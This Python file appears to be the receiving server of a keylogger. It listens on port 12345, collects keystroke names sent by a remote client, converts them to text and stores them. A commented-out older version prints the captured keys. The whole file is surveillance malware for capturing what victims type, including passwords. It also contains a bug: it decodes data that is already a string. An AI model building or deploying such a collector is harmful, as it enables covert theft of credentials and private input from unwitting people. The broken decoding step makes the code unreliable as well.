import socket			 

serverSocket = socket.socket()		 
# print ("Socket successfully created")

port = 12345			
def keylogger():
    serverSocket.bind(('', port))
    serverSocket.listen(5)
    keylogger_data = []
    while True: 

        clientSocket, clientAddress = serverSocket.accept()	 
        print ('Got connection from', clientAddress )
        clientSocket.send('keylogger'.encode()) 
        while True: 
            data = clientSocket.recv(1024)
            if not data:
                break
            data = data.decode('utf-8')
            data = data.replace("'b'", "")
            data = data.replace("'", "")
            
            if data == "Key.backspace":
                # print('\b' + ' ' + '\b', end="")
                data = "back"
            else: 
                if data == "Key.shift":
                    data = ""
                if data == "Key.ctrl_l":
                    data = ""
                if data == "Key.alt_l":
                    data = ""
                if data == "Key.tab":
                    data = "\t"
                if data == "Key.enter":
                    data = "\n"
                if data == "Key.space":
                    data = "_"
                # print(data, end="")
                # return data
            
            data = data.decode('utf-8')
            keylogger_data.append(data) 
            # # Gửi dữ liệu đến tất cả các kết nối đã thiết lập
            # clientSocket.sendall(data.encode())

        clientSocket.close()
        break

    # return "thanks"

# serverSocket.bind(('', port))		 
# # print ("socket binded to %s" %(port)) 

# serverSocket.listen(5)	 
# print ("socket is listening in " + str(port))		 

# while True: 

#     clientSocket, clientAddress = serverSocket.accept()	 
#     print ('Got connection from', clientAddress )
#     clientSocket.send('Thank you for connecting'.encode()) 
    
#     while True: 
#         data = clientSocket.recv(1024)
#         if not data:
#             break
#         data = data.decode('utf-8')
#         data = data.replace("'b'", "")
#         data = data.replace("'", "")
        
#         if data == "Key.backspace":
#             print('\b' + ' ' + '\b', end="")
#         else: 
#             if data == "Key.shift":
#                 data = ""
#             if data == "Key.ctrl_l":
#                 data = ""
#             if data == "Key.alt_l":
#                 data = ""
#             if data == "Key.tab":
#                 data = "\t"
#             if data == "Key.enter":
#                 data = "\n"
#             if data == "Key.space":
#                 data = "_"
#             print(data, end="")

#     clientSocket.close()

#     break
